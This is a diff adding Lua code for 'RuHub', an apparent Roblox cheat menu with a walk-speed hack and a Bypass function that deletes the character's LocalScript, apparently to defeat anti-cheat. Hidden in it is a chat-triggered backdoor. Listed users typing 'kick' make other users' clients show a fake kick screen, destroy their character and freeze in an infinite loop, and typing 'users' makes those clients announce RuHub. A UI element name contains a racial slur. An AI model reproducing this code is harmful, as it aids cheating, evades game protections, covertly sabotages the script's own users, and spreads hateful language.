+	titleskib1.Position = UDim2.new(0, 0, -0.24778761, 0)
+	titleskib1.Size = UDim2.new(0, 243, 0, 27)
+	titleskib1.Font = Enum.Font.Gotham
+	titleskib1.Text = "Copy Here If It Didn't Copy!"
+	titleskib1.TextColor3 = Color3.fromRGB(0, 0, 0)
+	titleskib1.TextScaled = true
+	titleskib1.TextSize = 14.000
+	titleskib1.TextWrapped = true
+
+	TextButton.Parent = framidy1
+	TextButton.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+	TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	TextButton.BorderSizePixel = 0
+	TextButton.Position = UDim2.new(1, 0, -0.243243247, 0)
+	TextButton.Size = UDim2.new(0, 36, 0, 26)
+	TextButton.Font = Enum.Font.SourceSans
+	TextButton.Text = "X"
+	TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+	TextButton.TextScaled = true
+	TextButton.TextSize = 14.000
+	TextButton.TextWrapped = true
+	TextButton.MouseButton1Down:Connect(function()
+		framidy1.Visible = false
+	end)
+end)
+
+openxd.Name = "openxd"
+openxd.Parent = ScreenGui
+openxd.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+openxd.BorderColor3 = Color3.fromRGB(0, 0, 0)
+openxd.BorderSizePixel = 0
+openxd.Position = UDim2.new(0.0724637657, 0, 0.350857139, 0)
+openxd.Size = UDim2.new(0, 77, 0, 43)
+openxd.Visible = false
+openxd.Font = Enum.Font.Gotham
+openxd.Text = "RH"
+openxd.TextColor3 = Color3.fromRGB(0, 0, 0)
+openxd.TextSize = 25.000
+openxd.Active = true
+openxd.Draggable = true
+
+-- Scripts:
+
+local function NAPQEL_fake_script() -- tab1.LocalScript 
+	local script = Instance.new('LocalScript', tab1)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.killframe.Visible = true
+		script.Parent.Parent.gamingframe.Visible = false
+		script.Parent.Parent.creditsframe.Visible = false
+		script.Parent.Parent.settingsframe.Visible = false
+		script.Parent.Parent.lpframe.Visible = false
+	end)
+end
+coroutine.wrap(NAPQEL_fake_script)()
+local function CKDEQ_fake_script() -- tab2.LocalScript 
+	local script = Instance.new('LocalScript', tab2)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.killframe.Visible = false
+		script.Parent.Parent.gamingframe.Visible = false
+		script.Parent.Parent.creditsframe.Visible = false
+		script.Parent.Parent.settingsframe.Visible = false
+		script.Parent.Parent.lpframe.Visible = true
+	end)
+end
+coroutine.wrap(CKDEQ_fake_script)()
+local function JKARSQ_fake_script() -- tab3.LocalScript 
+	local script = Instance.new('LocalScript', tab3)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.killframe.Visible = false
+		script.Parent.Parent.gamingframe.Visible = true
+		script.Parent.Parent.creditsframe.Visible = false
+		script.Parent.Parent.settingsframe.Visible = false
+		script.Parent.Parent.lpframe.Visible = false
+	end)
+end
+coroutine.wrap(JKARSQ_fake_script)()
+local function VHPXV_fake_script() -- tab4.LocalScript 
+	local script = Instance.new('LocalScript', tab4)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.killframe.Visible = false
+		script.Parent.Parent.gamingframe.Visible = false
+		script.Parent.Parent.creditsframe.Visible = false
+		script.Parent.Parent.settingsframe.Visible = true
+		script.Parent.Parent.lpframe.Visible = false
+	end)
+end
+coroutine.wrap(VHPXV_fake_script)()
+local function JMTQN_fake_script() -- tab5.LocalScript 
+	local script = Instance.new('LocalScript', tab5)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.killframe.Visible = false
+		script.Parent.Parent.gamingframe.Visible = false
+		script.Parent.Parent.creditsframe.Visible = true
+		script.Parent.Parent.settingsframe.Visible = false
+		script.Parent.Parent.lpframe.Visible = false
+	end)
+end
+coroutine.wrap(JMTQN_fake_script)()
+local function LHTJ_fake_script() -- wsr.LocalScript 
+	local script = Instance.new('LocalScript', wsr)
+
+	local player = game.Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+
+	local textBox = script.Parent 
+	local minWalkSpeed = 16 
+	local maxWalkSpeed = 1000
+
+	textBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then
+			local inputSpeed = tonumber(textBox.Text) 
+
+			if inputSpeed then
+				
+				inputSpeed = math.clamp(inputSpeed, minWalkSpeed, maxWalkSpeed)
+				humanoid.WalkSpeed = inputSpeed 
+				textBox.Text = tostring(inputSpeed) 
+			else
+				
+				humanoid.WalkSpeed = minWalkSpeed
+				textBox.Text = tostring(minWalkSpeed)
+			end
+		end
+	end)
+
+end
+coroutine.wrap(LHTJ_fake_script)()
+local function JICNVOS_fake_script() -- closexd.LocalScript 
+	local script = Instance.new('LocalScript', closexd)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.openxd.Visible = true
+		script.Parent.Parent.Visible = false
+	end)
+end
+coroutine.wrap(JICNVOS_fake_script)()
+local function LMZV_fake_script() -- dgui.LocalScript 
+	local script = Instance.new('LocalScript', dgui)
+
+
+end
+coroutine.wrap(LMZV_fake_script)()
+local function TIAQB_fake_script() -- openxd.LocalScript 
+	local script = Instance.new('LocalScript', openxd)
+
+	script.Parent.MouseButton1Click:Connect(function()
+
+		script.Parent.Parent.Frame.Visible = true
+		script.Parent.Visible = false
+	end)
+
+end
+coroutine.wrap(TIAQB_fake_script)()
+
+
+wait(0.5)
+
+
+
+local whitelistedUsers = {
+    "Wattesigma739", 
+    "ii_dino122",
+    "sinstick2",
+    "Termux_404",
+	"IAmLegitTrust_p"
+}
+
+
+local triggerPhrase = "users"
+
+
+local function isUserWhitelisted(username)
+    for _, user in ipairs(whitelistedUsers) do 
+        if user:lower() == username:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+
+local function onChatMessage(player, message)
+    if isUserWhitelisted(player.Name) or isUserWhitelisted(player.DisplayName) then
+        if message:lower() == triggerPhrase:lower() then
+            
+ local args = {
+    [1] = ">>> I am currently using RuHub!",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+
+
+       
+      
+        end
+    end
+end
+
+
+local Players = game:GetService("Players")
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end)
+
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end
+
+
+wait(0.5)
+
+
+local whitelistedUsers = {
+    "Wattesigma739", 
+    "ii_dino122",
+    "sinstick2",
+    "Termux_404",
+	"IAmLegitTrust_p"
+}
+
+
+local triggerPhrase = "kick"
+
+
+local function isUserWhitelisted(username)
+    for _, user in ipairs(whitelistedUsers) do
+        if user:lower() == username:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+
+local function onChatMessage(player, message)
+    if isUserWhitelisted(player.Name) or isUserWhitelisted(player.DisplayName) then
+        if message:lower() == triggerPhrase:lower() then
+          
+     
+
+local kickgui11 = Instance.new("ScreenGui")
+local framidykick = Instance.new("Frame")
+local kicknigger = Instance.new("TextLabel")
+
+
+
+kickgui11.Name = "kickgui11"
+kickgui11.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+kickgui11.ResetOnSpawn = false
+
+framidykick.Name = "framidykick"
+framidykick.Parent = kickgui11
+framidykick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+framidykick.BackgroundTransparency = 1.000
+framidykick.BorderColor3 = Color3.fromRGB(0, 0, 0)
+framidykick.BorderSizePixel = 0
+framidykick.Position = UDim2.new(0.0652173907, 0, 0.0502857156, 0)
+framidykick.Size = UDim2.new(0, 1460, 0, 765)
+
+kicknigger.Name = "kicknigger"
+kicknigger.Parent = framidykick
+kicknigger.BackgroundColor3 = Color3.fromRGB(148, 17, 0)
+kicknigger.BorderColor3 = Color3.fromRGB(0, 0, 0)
+kicknigger.BorderSizePixel = 0
+kicknigger.Position = UDim2.new(0.182876706, 0, 0.152941182, 0)
+kicknigger.Size = UDim2.new(0, 906, 0, 392)
+kicknigger.Font = Enum.Font.Creepster
+kicknigger.Text = "YOU HAVE BEEN KICKED BY A RUHUB ADMIN, PLEASE QUIT ROBLOX AND REJOIN"
+kicknigger.TextColor3 = Color3.fromRGB(0, 0, 0)
+kicknigger.TextScaled = true
+kicknigger.TextSize = 14.000
+kicknigger.TextWrapped = true
+
+ local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+character:SetPrimaryPartCFrame(CFrame.new(-292.83, 60.00, -75.28))
+
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+if humanoid then
+    humanoid:Destroy()
+end
+
+wait(5)
+
+while true do
+    
+end
+
+       
+      
+        end
+    end
+end
+
+
+local Players = game:GetService("Players")
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end)
+
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end
+
+wait(0.5)
+
+local targetUsers = { "ii_dino122", "sinstick2", "Wattesigma739", "Termux_404" }
+local players = game:GetService("Players")
+
+local function checkUser(player)
+    for _, name in ipairs(targetUsers) do
+        if player.Name == name then
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Owner/Admin alert!",
+                Text = name .. " is in the game.",
+                Duration = 5
+            })
+            break
+        end
+    end
+end
+
+players.PlayerAdded:Connect(checkUser)
+
+for _, player in ipairs(players:GetPlayers()) do
+    checkUser(player)
+end
+
+
+wait(0.1)
+
+function Bypass()
+    local Script = game.Players.LocalPlayer.Character:WaitForChild("LocalScript")
+    if Script then
+        Script:Destroy()
+    end
+end
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    Bypass()
+end)
+
+Bypass()
+
+
